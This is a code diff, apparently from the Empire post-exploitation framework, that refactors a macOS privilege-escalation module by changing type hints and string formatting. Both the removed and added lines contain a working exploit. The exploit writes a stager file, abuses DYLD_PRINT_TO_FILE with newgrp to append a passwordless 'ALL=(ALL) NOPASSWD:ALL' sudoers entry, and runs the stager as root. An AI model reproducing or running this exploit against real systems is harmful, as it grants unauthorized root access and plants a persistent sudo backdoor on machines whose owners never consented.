@@ -1,5 +1,4 @@
 import logging
-from typing import Dict
 
 from empire.server.core.module_models import EmpireModule
 
@@ -11,7 +10,7 @@ class Module:
     def generate(
         main_menu,
         module: EmpireModule,
-        params: Dict,
+        params: dict,
         obfuscate: bool = False,
         obfuscation_command: str = "",
     ):
@@ -36,21 +35,19 @@ class Module:
         launcher = launcher.replace('"', '\\"')
         fullPath = params["WriteablePath"] + params["FileName"]
         fileName = params["FileName"]
-        script = """
+        script = f"""
 import os
-print("Writing Stager to {filename}...")
-file = open("{fullpath}","w")
-file.write("{filecontents}")
+print("Writing Stager to {fileName}...")
+file = open("{fullPath}","w")
+file.write("{launcher}")
 file.close()
 print("Attempting to execute stager as root...")
 try:
-	os.system("echo 'echo \\"$(whoami) ALL=(ALL) NOPASSWD:ALL\\" >&3' | DYLD_PRINT_TO_FILE=/etc/sudoers newgrp; sudo /bin/sh {fullpath} &")
+	os.system("echo 'echo \\"$(whoami) ALL=(ALL) NOPASSWD:ALL\\" >&3' | DYLD_PRINT_TO_FILE=/etc/sudoers newgrp; sudo /bin/sh {fullPath} &")
 	print("Successfully ran command, you should be getting an elevated stager")
 except:
 	print("[!] Could not execute payload!")
 
-	""".format(
-            fullpath=fullPath, filecontents=launcher, filename=fileName
-        )
+	"""
 
         return script
